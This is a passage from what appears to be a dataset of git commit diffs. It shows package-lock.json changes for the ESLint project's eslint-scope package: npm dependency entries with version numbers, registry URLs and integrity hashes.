""sha1-7RQaasBDqEnqWISY59yosVMw6Qw=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""pinkie"": {<\n>-      ""version"": ""2.0.4""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/pinkie/-/pinkie-2.0.4.tgz""<c><\n>-      ""integrity"": ""sha1-clVrgM+g1IqXToDnckjoDtT3+HA=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""pinkie-promise"": {<\n>-      ""version"": ""2.0.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/pinkie-promise/-/pinkie-promise-2.0.1.tgz""<c><\n>-      ""integrity"": ""sha1-ITXW36ejWMBprJsXh3YogihFD/o=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""pinkie"": ""2.0.4""<\n>-      }<\n>-    }<c><\n>-    ""pkginfo"": {<\n>-      ""version"": ""0.3.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/pkginfo/-/pkginfo-0.3.1.tgz""<c><\n>-      ""integrity"": ""sha1-Wyn2qB9wcXFC4J52W76rl7T4HiE=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""pluralize"": {<\n>-      ""version"": ""1.2.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/pluralize/-/pluralize-1.2.1.tgz""<c><\n>-      ""integrity"": ""sha1-0aIUg/0iu0HlihL6NCGCMUCJfEU=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""prelude-ls"":",F
17,56,56,569,4,26,ESLint Jenkins <eslint@googlegroups.com>,-1,-1,-1,-1,-1,-1,-1,Fri,21,46,27 Apr 2018,4.0.0-alpha.0,0,1,1,2319,79643,"+  ""name"": ""eslint-scope""<c><\n>+  ""version"": ""4.0.0-alpha.0""<c><\n>+  ""lockfileVersion"": 1<c><\n>+  ""requires"": true<c><\n>+  ""dependencies"": {<\n>+    ""abbrev"": {<\n>+      ""version"": ""1.1.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/abbrev/-/abbrev-1.1.1.tgz""<c><\n>+      ""integrity"": ""sha512-nne9/IiQ/hzIhY6pdDnbBtz7DjPTKrY00P/zvPSm5pOFkl6xuGrGnXn/VtTNNfNtAfZ9/1RtehkszU9qcTii0Q==""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""acorn"": {<\n>+      ""version"": ""5.5.3""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/acorn/-/acorn-5.5.3.tgz""<c><\n>+      ""integrity"": ""sha512-jd5MkIUlbbmb07nXH0DT3y7rDVtkzDi4XZOUVWAer8ajmF/DTSSbl5oNFyDOl/OXA33Bl79+ypHhl2pN20VeOQ==""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""acorn-jsx"": {<\n>+      ""version"": ""3.0.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/acorn-jsx/-/acorn-jsx-3.0.1.tgz""<c><\n>+      ""integrity"": ""sha1-r9+UiPsezvyDSPb7IvRk4ypYs2s=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""acorn"": ""3.3.0""<\n>+      }<c><\n>+      ""dependencies"": {<\n>+        ""acorn"": {<\n>+          ""version"": ""3.3.0""<c><\n>+          ""resolved"": ""https://registry.npmjs.org/acorn/-/acorn-3.3.0.tgz""<c><\n>+          ""integrity"": ""sha1-ReN/s56No/JbruP/U2niu18iAXo=""<c><\n>+          ""dev"": true<\n>+        }<\n>+      }<\n>+    }<c><\n>+    ""ajv"": {<\n>+      ""version"": ""4.11.8""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/ajv/-/ajv-4.11.8.tgz""<c><\n>+      ""integrity"": ""sha1-gv+wKynmYq5TvcIK8VlHcGc5xTY=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""co"": ""4.6.0""<c><\n>+        ""json-stable-stringify"": ""1.0.1""<\n>+      }<\n>+    }<c><\n>+    ""ajv-keywords"": {<\n>+      ""version"": ""1.5.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/ajv-keywords/-/ajv-keywords-1.5.1.tgz""<c><\n>+      ""integrity"": ""sha1-MU3QpLM2j609/NxU7eYXG4htrzw=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""align-text"": {<\n>+      ""version"": ""0.1.4""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/align-text/-/align-text-0.1.4.tgz""<c><\n>+      ""integrity"": ""sha1-DNkKVhCT810KmSVsIrcGlDP60Rc=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""kind-of"": ""3.2.2""<c><\n>+        ""longest"": ""1.0.1""<c><\n>+        ""repeat-string"": ""1.6.1""<\n>+      }<\n>+    }<c><\n>+    ""amdefine"": {<\n>+      ""version"": ""1.0.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/amdefine/-/amdefine-1.0.1.tgz""<c><\n>+      ""integrity"": ""sha1-SlKCrBZHKek2Gbz9OtFR+BfOkfU=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""ansi-escapes"": {<\n>+      ""version"": ""1.4.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/ansi-escapes/-/ansi-escapes-1.4.0.tgz""<c><\n>+      ""integrity"": ""sha1-06ioOzGapneTZisT52HHkRQiMG4=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""ansi-regex"": {<\n>+      ""version"": ""2.1.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/ansi-regex/-/ansi-regex-2.1.1.tgz""<c><\n>+      ""integrity"": ""sha1-w7M6te42DYbg5ijwRorn7yfWVN8=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""ansi-styles"": {<\n>+      ""version"": ""2.2.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/ansi-styles/-/ansi-styles-2.2.1.tgz""<c><\n>+      ""integrity"": ""sha1-tDLdM1i2NM914eRmQ2gkBTPB3b4=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""argparse"": {<\n>+      ""version"": ""1.0.10""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/argparse/-/argparse-1.0.10.tgz""<c><\n>+      ""integrity"": ""sha512-o5Roy6tNG4SL/FOkCAN6RzjiakZS25RLYFrcMttJqbdd8BWrnA+fGz57iN5Pb06pvBGvl5gQ0B48dJlslXvoTg==""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""sprintf-js"": ""1.0.3""<\n>+      }<\n>+    }<c><\n>+    ""array-find-index"": {<\n>+      ""version"": ""1.0.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/array-find-index/-/array-find-index-1.0.2.tgz""<c><\n>+      ""integrity"": ""sha1-3wEKoSh+Fku9pvlyOwqWoexBh6E=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""array-union"": {<\n>+      ""version"": ""1.0.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/array-union/-/array-union-1.0.2.tgz""<c><\n>+      ""integrity"": ""sha1-mjRBDk9OPaI96jdb5b5w8kd47Dk=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""array-uniq"": ""1.0.3""<\n>+      }<\n>+    }<c><\n>+    ""array-uniq"": {<\n>+      ""version"": ""1.0.3""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/array-uniq/-/array-uniq-1.0.3.tgz""<c><\n>+      ""integrity"": ""sha1-r2rId6Jcx/dOBYiUdThY39sk/bY=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""arrify"": {<\n>+      ""version"": ""1.0.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/arrify/-/arrify-1.0.1.tgz""<c><\n>+      ""integrity"": ""sha1-iYUI2iIm84DfkEcoRWhJwVAaSw0=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""asap"": {<\n>+      ""version"": ""2.0.6""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/asap/-/asap-2.0.6.tgz""<c><\n>+      ""integrity"": ""sha1-5QNHYR1+aQlDIIu9r+vLwvuGbUY=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""assertion-error"": {<\n>+      ""version"": ""1.1.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/assertion-error/-/assertion-error-1.1.0.tgz""<c><\n>+      ""integrity"": ""sha512-jgsaNduz+ndvGyFt3uSuWqvy4lCnIJiovtouQN5JZHOKCS2QuhEdbcQHFhVksz2N2U9hXJo8odG7ETyWlEeuDw==""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""async"": {<\n>+      ""version"": ""1.5.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/async/-/async-1.5.2.tgz""<c><\n>+      ""integrity"": ""sha1-7GphrlZIDAw8skHJVhjiCJL5Zyo=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""axios"": {<\n>+      ""version"": ""0.10.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/axios/-/axios-0.10.0.tgz""<c><\n>+      ""integrity"": ""sha1-Ww7A1ftT55uYt7+EwOmxz5Av38Q=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""follow-redirects"": ""0.0.7""<\n>+      }<\n>+    }<c><\n>+    ""babel-code-frame"": {<\n>+      ""version"": ""6.26.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/babel-code-frame/-/babel-code-frame-6.26.0.tgz""<c><\n>+      ""integrity"": ""sha1-Y/1D99weO7fONZR9uP42mj9Yx0s=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""chalk"": ""1.1.3""<c><\n>+        ""esutils"": ""2.0.2""<c><\n>+        ""js-tokens"": ""3.0.2""<\n>+      }<\n>+    }<c><\n>+    ""balanced-match"": {<\n>+      ""version"": ""1.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/balanced-match/-/balanced-match-1.0.0.tgz""<c><\n>+      ""integrity"": ""sha1-ibTRmasr7kneFk6gK4nORi1xt2c=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""brace-expansion"": {<\n>+      ""version"": ""1.1.11""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.11.tgz""<c><\n>+      ""integrity"": ""sha512-iCuPHDFgrHX7H2vEI/5xpz07zSHB00TpugqhmYtVmMO6518mCuRMoOYFldEBl0g187ufozdaHgWKcYFb61qGiA==""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""balanced-match"": ""1.0.0""<c><\n>+        ""concat-map"": ""0.0.1""<\n>+      }<\n>+    }<c><\n>+    ""browser-stdout"": {<\n>+      ""version"": ""1.3.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/browser-stdout/-/browser-stdout-1.3.0.tgz""<c><\n>+      ""integrity"": ""sha1-81HTKWnTL6XXpVZxVCY9korjvR8=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""buffer-from"": {<\n>+      ""version"": ""1.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/buffer-from/-/buffer-from-1.0.0.tgz""<c><\n>+      ""integrity"": ""sha512-83apNb8KK0Se60UE1+4Ukbe3HbfELJ6UlI4ldtOGs7So4KD26orJM8hIY9lxdzP+UpItH1Yh/Y8GUvNFWFFRxA==""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""builtin-modules"": {<\n>+      ""version"": ""1.1.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/builtin-modules/-/builtin-modules-1.1.1.tgz""<c><\n>+      ""integrity"": ""sha1-Jw8HbFpywC9bZaR9+Uxf46J4iS8=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""caller-path"": {<\n>+      ""version"": ""0.1.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/caller-path/-/caller-path-0.1.0.tgz""<c><\n>+      ""integrity"": ""sha1-lAhe9jWB7NPaqSREqP6U6CV3dR8=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""callsites"": ""0.2.0""<\n>+      }<\n>+    }<c><\n>+    ""callsites"": {<\n>+      ""version"": ""0.2.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/callsites/-/callsites-0.2.0.tgz""<c><\n>+      ""integrity"": ""sha1-r6uWJikQp/M8GaV3WCXGnzTjUMo=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""camelcase"": {<\n>+      ""version"": ""2.1.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/camelcase/-/camelcase-2.1.1.tgz""<c><\n>+      ""integrity"": ""sha1-fB0W1nmhu+WcoCys7PsBHiAfWh8=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""camelcase-keys"": {<\n>+      ""version"": ""2.1.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/camelcase-keys/-/camelcase-keys-2.1.0.tgz""<c><\n>+      ""integrity"": ""sha1-MIvur/3ygRkFHvodkyITyRuPkuc=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""camelcase"": ""2.1.1""<c><\n>+        ""map-obj"": ""1.0.1""<\n>+      }<\n>+    }<c><\n>+    ""center-align"": {<\n>+      ""version"": ""0.1.3""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/center-align/-/center-align-0.1.3.tgz""<c><\n>+      ""integrity"": ""sha1-qg0yYptu6XIgBBHL1EYckHvCt60=""<c><\n>+      ""dev"": true<c><\n>+      ""optional"": true<c><\n>+      ""requires"": {<\n>+        ""align-text"": ""0.1.4""<c><\n>+        ""lazy-cache"": ""1.0.4""<\n>+      }<\n>+    }<c><\n>+    ""chai"": {<\n>+      ""version"": ""3.5.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/chai/-/chai-3.5.0.tgz""<c><\n>+      ""integrity"": ""sha1-TQJjewZ/6Vi9v906QOxW/vc3Mkc=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""assertion-error"": ""1.1.0""<c><\n>+        ""deep-eql"": ""0.1.3""<c><\n>+        ""type-detect"": ""1.0.0""<\n>+      }<\n>+    }<c><\n>+    ""chalk"": {<\n>+      ""version"": ""1.1.3""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/chalk/-/chalk-1.1.3.tgz""<c><\n>+      ""integrity"": ""sha1-qBFcVeSnAv5NFQq9OHKCKn4J/Jg=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""ansi-styles"": ""2.2.1""<c><\n>+        ""escape-string-regexp"": ""1.0.5""<c><\n>+        ""has-ansi"": ""2.0.0""<c><\n>+        ""strip-ansi"": ""3.0.1""<c><\n>+        ""supports-color"": ""2.0.0""<\n>+      }<\n>+    }<c><\n>+    ""circular-json"": {<\n>+      ""version"": ""0.3.3""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/circular-json/-/circular-json-0.3.3.tgz""<c><\n>+      ""integrity"": ""sha512-UZK3NBx2Mca+b5LsG7bY183pHWt5Y1xts4P3Pz7ENTwGVnJOUWbRb3ocjvX7hx9tq/yTAdclXm9sZ38gNuem4A==""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""cli-cursor"": {<\n>+      ""version"": ""1.0.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/cli-cursor/-/cli-cursor-1.0.2.tgz""<c><\n>+      ""integrity"": ""sha1-ZNo/fValRBLll5S9Ytw1KV6PKYc=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""restore-cursor"": ""1.0.1""<\n>+      }<\n>+    }<c><\n>+    ""cli-width"": {<\n>+      ""version"": ""2.2.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/cli-width/-/cli-width-2.2.0.tgz""<c><\n>+      ""integrity"": ""sha1-/xnt6Kml5XkyQUewwR8PvLq+1jk=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""cliui"": {<\n>+      ""version"": ""2.1.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/cliui/-/cliui-2.1.0.tgz""<c><\n>+      ""integrity"": ""sha1-S0dXYP+AJkx2LDoXGQMukcf+oNE=""<c><\n>+      ""dev"": true<c><\n>+      ""optional"": true<c><\n>+      ""requires"": {<\n>+        ""center-align"": ""0.1.3""<c><\n>+        ""right-align"": ""0.1.3""<c><\n>+        ""wordwrap"": ""0.0.2""<\n>+      }<c><\n>+      ""dependencies"": {<\n>+        ""wordwrap"": {<\n>+          ""version"": ""0.0.2""<c><\n>+          ""resolved"": ""https://registry.npmjs.org/wordwrap/-/wordwrap-0.0.2.tgz""<c><\n>+          ""integrity"": ""sha1-t5Zpu0LstAn4PVg8rVLKF+qhZD8=""<c><\n>+          ""dev"": true<c><\n>+          ""optional"": true<\n>+        }<\n>+      }<\n>+    }<c><\n>+    ""co"": {<\n>+      ""version"": ""4.6.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/co/-/co-4.6.0.tgz""<c><\n>+      ""integrity"": ""sha1-bqa989hTrlTMuOR7+gvz+QMfsYQ=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""code-point-at"": {<\n>+      ""version"": ""1.1.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/code-point-at/-/code-point-at-1.1.0.tgz""<c><\n>+      ""integrity"": ""sha1-DQcLTQQ6W+ozovGkDi7bPZpMz3c=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""commander"": {<\n>+      ""version"": ""2.9.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/commander/-/commander-2.9.0.tgz""<c><\n>+      ""integrity"": ""sha1-nJkJQXbhIkDLItbFFGCYQA/g99Q=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""graceful-readlink"": ""1.0.1""<\n>+      }<\n>+    }<c><\n>+    ""concat-map"": {<\n>+      ""version"": ""0.0.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/concat-map/-/concat-map-0.0.1.tgz""<c><\n>+      ""integrity"": ""sha1-2Klr13/Wjfd5OnMDajug1UBdR3s=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""concat-stream"": {<\n>+      ""version"": ""1.6.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/concat-stream/-/concat-stream-1.6.2.tgz""<c><\n>+      ""integrity"": ""sha512-27HBghJxjiZtIk3Ycvn/4kbJk/1uZuJFfuPEns6LaEvpvG1f0hTea8lilrouyo9mVc2GWdcEZ8OLoGmSADlrCw==""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""buffer-from"": ""1.0.0""<c><\n>+        ""inherits"": ""2.0.3""<c><\n>+        ""readable-stream"": ""2.3.6""<c><\n>+        ""typedarray"": ""0.0.6""<\n>+      }<\n>+    }<c><\n>+    ""core-util-is"": {<\n>+      ""version"": ""1.0.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/core-util-is/-/core-util-is-1.0.2.tgz""<c><\n>+      ""integrity"": ""sha1-tf1UIgqivFq1eqtxQMlAdUUDwac=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""currently-unhandled"": {<\n>+      ""version"": ""0.4.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/currently-unhandled/-/currently-unhandled-0.4.1.tgz""<c><\n>+      ""integrity"": ""sha1-mI3zP+qxke95mmE2nddsF635V+o=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""array-find-index"": ""1.0.2""<\n>+      }<\n>+    }<c><\n>+    ""d"": {<\n>+      ""version"": ""1.0.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/d/-/d-1.0.0.tgz""<c><\n>+      ""integrity"": ""sha1-dUu1v+VUUdpppYuU1F9MWwRi1Y8=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""es5-ext"": ""0.10.42""<\n>+      }<\n>+    }<c><\n>+    ""dateformat"": {<\n>+      ""version"": ""1.0.12""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/dateformat/-/dateformat-1.0.12.tgz""<c><\n>+      ""integrity"": ""sha1-nxJLZ1lMk3/3BpMuSmQsyo27/uk=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""get-stdin"": ""4.0.1""<c><\n>+        ""meow"": ""3.7.0""<\n>+      }<\n>+    }<c><\n>+    ""debug"": {<\n>+      ""version"": ""2.6.9""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/debug/-/debug-2.6.9.tgz""<c><\n>+      ""integrity"": ""sha512-bC7ElrdJaJnPbAP+1EotYvqZsb3ecl5wi6Bfi6BJTUcNowp6cvspg0jXznRTKDjm/E7AdgFBVeAPVMNcKGsHMA==""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""ms"": ""2.0.0""<\n>+      }<\n>+    }<c><\n>+    ""debuglog"": {<\n>+      ""version"": ""1.0.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/debuglog/-/debuglog-1.0.1.tgz""<c><\n>+      ""integrity"": ""sha1-qiT/uaw9+aI1GDfPstJ5NgzXhJI=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""decamelize"": {<\n>+      ""version"": ""1.2.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/decamelize/-/decamelize-1.2.0.tgz""<c><\n>+      ""integrity"": ""sha1-9lNNFRSCabIDUue+4m9QH5oZEpA=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""deep-eql"": {<\n>+      ""version"": ""0.1.3""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/deep-eql/-/deep-eql-0.1.3.tgz""<c><\n>+      ""integrity"": ""sha1-71WKyrjeJSBs1xOQbXTlaTDrafI=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""type-detect"": ""0.1.1""<\n>+      }<c><\n>+      ""dependencies"": {<\n>+        ""type-detect"": {<\n>+          ""version"": ""0.1.1""<c><\n>+          ""resolved"": ""https://registry.npmjs.org/type-detect/-/type-detect-0.1.1.tgz""<c><\n>+          ""integrity"": ""sha1-C6XsKohWQORw6k6FBZcZANrFiCI=""<c><\n>+          ""dev"": true<\n>+        }<\n>+      }<\n>+    }<c><\n>+    ""deep-is"": {<\n>+      ""version"": ""0.1.3""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/deep-is/-/deep-is-0.1.3.tgz""<c><\n>+      ""integrity"": ""sha1-s2nW+128E+7PUk+RsHD+7cNXzzQ=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""del"": {<\n>+      ""version"": ""2.2.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/del/-/del-2.2.2.tgz""<c><\n>+      ""integrity"": ""sha1-wSyYHQZ4RshLyvhiz/kw2Qf/0ag=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""globby"": ""5.0.0""<c><\n>+        ""is-path-cwd"": ""1.0.0""<c><\n>+        ""is-path-in-cwd"": ""1.0.1""<c><\n>+        ""object-assign"": ""4.1.1""<c><\n>+        ""pify"": ""2.3.0""<c><\n>+        ""pinkie-promise"": ""2.0.1""<c><\n>+        ""rimraf"": ""2.6.2""<\n>+      }<\n>+    }<c><\n>+    ""dezalgo"": {<\n>+      ""version"": ""1.0.3""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/dezalgo/-/dezalgo-1.0.3.tgz""<c><\n>+      ""integrity"": ""sha1-f3Qt4Gb8dIvI24IFad3c5Jvw1FY=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""asap"": ""2.0.6""<c><\n>+        ""wrappy"": ""1.0.2""<\n>+      }<\n>+    }<c><\n>+    ""diff"": {<\n>+      ""version"": ""3.2.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/diff/-/diff-3.2.0.tgz""<c><\n>+      ""integrity"": ""sha1-yc45Okt8vQsFinJck98pkCeGj/k=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""doctrine"": {<\n>+      ""version"": ""2.1.0""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/doctrine/-/doctrine-2.1.0.tgz""<c><\n>+      ""integrity"": ""sha512-35mSku4ZXK0vfCuHEDAwt55dg2jNajHZ1odvF+8SSr82EsZY4QmXfuWso8oEd8zRhVObSN18aM0CjSdoBX7zIw==""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""esutils"": ""2.0.2""<\n>+      }<\n>+    }<c><\n>+    ""error-ex"": {<\n>+      ""version"": ""1.3.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/error-ex/-/error-ex-1.3.1.tgz""<c><\n>+      ""integrity"": ""sha1-+FWobOYa3E6GIcPNoh56dhLDqNw=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""is-arrayish"": ""0.2.1""<\n>+      }<\n>+    }<c><\n>+    ""es5-ext"": {<\n>+      ""version"": ""0.10.42""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/es5-ext/-/es5-ext-0.10.42.tgz""<c><\n>+      ""integrity"": ""sha512-AJxO1rmPe1bDEfSR6TJ/FgMFYuTBhR5R57KW58iCkYACMyFbrkqVyzXSurYoScDGvgyMpk7uRF/lPUPPTmsRSA==""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""es6-iterator"": ""2.0.3""<c><\n>+        ""es6-symbol"": ""3.1.1""<c><\n>+        ""next-tick"": ""1.0.0""<\n>+      }<\n>+    }<c><\n>+    ""es6-iterator"": {<\n>+      ""version"": ""2.0.3""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/es6-iterator/-/es6-iterator-2.0.3.tgz""<c><\n>+      ""integrity"": ""sha1-p96IkUGgWpSwhUQDstCg+/qY87c=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""d"": ""1.0.0""<c><\n>+        ""es5-ext"": ""0.10.42""<c><\n>+        ""es6-symbol"": ""3.1.1""<\n>+      }<\n>+    }<c><\n>+    ""es6-map"": {<\n>+      ""version"": ""0.1.5""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/es6-map/-/es6-map-0.1.5.tgz""<c><\n>+      ""integrity"": ""sha1-kTbgUD3MBqMBaQ8LsU/042TpSfA=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""d"": ""1.0.0""<c><\n>+        ""es5-ext"": ""0.10.42""<c><\n>+        ""es6-iterator"": ""2.0.3""<c><\n>+        ""es6-set"": ""0.1.5""<c><\n>+        ""es6-symbol"": ""3.1.1""<c><\n>+        ""event-emitter"": ""0.3.5""<\n>+      }<\n>+    }<c><\n>+    ""es6-promise"": {<\n>+      ""version"": ""3.3.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/es6-promise/-/es6-promise-3.3.1.tgz""<c><\n>+      ""integrity"": ""sha1-oIzd6EzNvzTQJ6FFG8kdS80ophM=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""es6-set"": {<\n>+      ""version"": ""0.1.5""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/es6-set/-/es6-set-0.1.5.tgz""<c><\n>+      ""integrity"": ""sha1-0rPsXU2ADO2BjbU40ol02wpzzLE=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""d"": ""1.0.0""<c><\n>+        ""es5-ext"": ""0.10.42""<c><\n>+        ""es6-iterator"": ""2.0.3""<c><\n>+        ""es6-symbol"": ""3.1.1""<c><\n>+        ""event-emitter"": ""0.3.5""<\n>+      }<\n>+    }<c><\n>+    ""es6-symbol"": {<\n>+      ""version"": ""3.1.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/es6-symbol/-/es6-symbol-3.1.1.tgz""<c><\n>+      ""integrity"": ""sha1-vwDvT9q2uhtG7Le2KbTH7VcVzHc=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""d"": ""1.0.0""<c><\n>+        ""es5-ext"": ""0.10.42""<\n>+      }<\n>+    }<c><\n>+    ""es6-weak-map"": {<\n>+      ""version"": ""2.0.2""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/es6-weak-map/-/es6-weak-map-2.0.2.tgz""<c><\n>+      ""integrity"": ""sha1-XjqzIlH/0VOKH45f+hNXdy+S2W8=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""d"": ""1.0.0""<c><\n>+        ""es5-ext"": ""0.10.42""<c><\n>+        ""es6-iterator"": ""2.0.3""<c><\n>+        ""es6-symbol"": ""3.1.1""<\n>+      }<\n>+    }<c><\n>+    ""escape-string-regexp"": {<\n>+      ""version"": ""1.0.5""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/escape-string-regexp/-/escape-string-regexp-1.0.5.tgz""<c><\n>+      ""integrity"": ""sha1-G2HAViGQqN/2rjuyzwIAyhMLhtQ=""<c><\n>+      ""dev"": true<\n>+    }<c><\n>+    ""escodegen"": {<\n>+      ""version"": ""1.8.1""<c><\n>+      ""resolved"": ""https://registry.npmjs.org/escodegen/-/escodegen-1.8.1.tgz""<c><\n>+      ""integrity"": ""sha1-WltTr0aTEQvrsIZ6o0MN07cKEBg=""<c><\n>+      ""dev"": true<c><\n>+      ""requires"": {<\n>+        ""esprima"": ""2.7.3""<c><\n>+        ""estraverse"": ""1.9.3""<c><\n>+        ""esutils"": ""2.0.2""<c><\n>+        ""optionator"": ""0.8.2""<c><\n>+        ""source-map"": ""0.2.0""<\n>+      }<c><\n>+      ""dependencies"": {<\n>+        ""esprima"": {<\n>+          ""version"": ""2.7.3""<c><\n>+          ""resolved"": 